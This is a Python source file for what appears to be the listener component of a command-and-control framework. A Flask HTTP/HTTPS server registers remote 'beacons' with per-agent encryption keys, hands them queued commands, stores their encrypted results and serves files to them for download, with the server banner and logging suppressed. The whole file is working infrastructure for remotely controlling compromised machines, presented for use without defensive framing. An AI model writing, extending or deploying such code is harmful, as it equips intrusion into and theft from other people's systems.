import sys
import threading

# from core.stash import *
from io import BytesIO
from core.logger import *
from core.crypto import *
from random import choice
from string import ascii_letters
from multiprocessing import Process
from os import path, getcwd
from flask import Flask, render_template, request, send_from_directory

class HTTP_listener:

    def __init__(self, l_type, name, ip, port, stash):
        self.name = name
        self.ip = ip
        self.port = port
        self.l_type = l_type

        self.stash = stash
        self.filePath = path.join(getcwd(), 'downloads')
        self.certPath = path.join(getcwd(), 'certs', 'cert.pem')
        self.privkeyPath = path.join(getcwd(), 'certs', 'key.pem')

        key = self.stash.get_key(name)
        if key:
            self.key = key[0][0]
        else:
            self.key = key_init()
            self.stash.register_list(name, l_type, self.key, ip, port)

        html_fold = path.join(getcwd(), 'core' ,'html')
        self.app = Flask(__name__, template_folder=html_fold)

        self.running = True

        @self.app.route('/', methods=['GET'])
        def index():
            return ('Hello there!')

        @self.app.route('/beacon/register', methods=['POST'])
        def register():
            beacon_name = ''.join(choice(ascii_letters) for i in range(10))
            beacon_ip = request.remote_addr

            beacon_hostname = request.form.get('name')
            beacon_hostname = DECRYPT(beacon_hostname, self.key)
            beacon_type = request.form.get('type')
            beacon_type = DECRYPT(beacon_type, self.key)
            
            # success(f'New undercover agent {beacon_name}.')
            agent_key = key_init()
            # fields = (beacon_name, self.name, beacon_ip, beacon_hostname, beacon_type, self.key, True)
            fields = (beacon_name, self.name, beacon_ip, beacon_hostname, beacon_type, agent_key, True)
            self.stash.sql_stash( '''INSERT INTO agents( agent_name, \
                                                         listener_name, \
                                                         remote_ip, \
                                                         hostname, \
                                                         beacon_type, \
                                                         enc_key, \
                                                         alive ) VALUES( ?, ?, ?, ?, ?, ?, ? )''', fields )

            send_it = ENCRYPT(f'VALID {beacon_name} {agent_key}', self.key)
            return (send_it, 200)

        @self.app.route('/tasks/<name>', methods=['GET'])
        def getinTask(name):
            task = self.stash.get_task(name)
            if task:
                key = self.stash.get_agent_key(agent=name)
                com_code = task[0][0]
                enc_comm = task[0][1]
                send_it = ENCRYPT(f'VALID {com_code} {enc_comm}', key)
                self.stash.del_commands(com_code)
                return (send_it, 200)
            else:
                # return (render_template(f'404.html', title = '404'), 404)
                return ('', 204)
        
        @self.app.route('/results/<code>', methods=['POST'])
        def ret_res(code):
            if self.stash.check_code(code):
                enc_result = request.form.get('result')
                if enc_result:
                    key = self.stash.get_agent_key(task=code)
                    result = DECRYPT(enc_result, key)
                else:
                    result = 'NA'
                self.stash.sql_stash( 'UPDATE commands_history SET output = ? WHERE command_code = ? ; ', (result, code) )
                if 'VALID agent renamed to ' in result:
                    agent_name = result.split()[-1]
                    old_name = self.stash.get_agent_from_comm(code)
                    self.stash.sql_stash( 'UPDATE agents SET agent_name = ? WHERE agent_name = ? ; ', (agent_name, old_name) )
                return ('', 204)
            else:
                error(f'Command Code {code} not found!')
                return (render_template(f'404.html', title = '404'), 404)

        @self.app.route('/download/<file>', methods=['GET'])
        def download(file):
            print(path.join(self.filePath, file))
            if path.isfile(path.join(self.filePath, file)):
                return (send_from_directory(self.filePath, file, as_attachment=True), 200)
            else:
                return (render_template(f'404.html', title = '404'), 404)

        @self.app.errorhandler(404)
        def page_not_found(error):
            return (render_template(f'404.html', title = '404'), 404)

    def run(self):
        # to fix (debug False and logger True)
        self.app.logger.disabled = True
        if self.l_type == 'HTTPS':
            self.app.run(port=self.port, host=self.ip, ssl_context=(self.certPath, self.privkeyPath), debug=False)
        else:
            self.app.run(port=self.port, host=self.ip, debug=False)

    def start(self):
        self.server = Process(name = self.name, target=self.run, args = (), daemon = True)

        ## no server banner
        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None

        self.server.start()
        self.running = True

    def stop(self):
        self.server.terminate()
        self.server = None
        # self.daemon = None
        self.running = False